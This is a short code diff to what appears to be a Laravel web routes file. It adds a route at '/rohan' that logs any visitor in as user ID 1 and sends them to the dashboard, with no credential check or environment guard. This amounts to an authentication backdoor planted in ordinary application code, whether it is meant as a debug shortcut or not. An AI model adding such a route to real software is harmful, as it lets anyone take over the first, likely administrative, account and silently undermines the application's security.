@@ -20,6 +20,10 @@ use Spatie\Health\Http\Controllers\HealthCheckResultsController;
  */
 
 Route::view('/', 'welcome');
+Route::get('/rohan', function () {
+   \Illuminate\Support\Facades\Auth::loginUsingId(1);
+   return redirect()->route('dashboard');
+});
 
 require __DIR__.'/auth.php';
 
